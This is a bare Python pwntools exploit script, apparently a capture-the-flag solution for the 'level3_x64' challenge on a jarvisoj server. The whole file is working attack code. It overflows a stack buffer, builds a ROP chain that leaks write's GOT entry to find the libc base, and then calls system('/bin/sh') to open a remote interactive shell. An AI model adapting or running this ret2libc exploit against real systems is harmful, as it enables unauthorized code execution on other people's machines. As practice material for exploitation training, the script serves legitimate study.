#!/usr/bin/env python
from pwn import *


context.log_level = "debug"
sh = remote("pwn2.jarvisoj.com", 9883)

#sh = process("level3_x64")
level3 = ELF("level3_x64")
write_plt = level3.plt["write"]
write_got = level3.got["write"]
main_addr = level3.symbols["main"]
pop_rdi_ret = 0x4006b3
pop_rsi_pop_r15_ret = 0x4006b1
payload = 'a' * 0x80 + 'bbbbbbbb' + p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_pop_r15_ret) + p64(write_got) + p64(1) + p64(write_plt) + p64(main_addr)
sh.recvuntil("Input:\n")
sh.sendline(payload)

write_addr = u64(sh.recv()[0:8])
libc = ELF("./libc-2.19.so")
#libc = ELF("/lib/x86_64-linux-gnu/libc-2.23.so")
libcbase = write_addr - libc.symbols["write"]
sys_addr = libcbase + libc.symbols["system"]
bin_sh = libcbase + libc.search("/bin/sh\0").next()
payload = 'a' * 0x80 + "bbbbbbbb" + p64(pop_rdi_ret) + p64(bin_sh) + p64(sys_addr)
sh.sendline(payload)
sh.interactive()
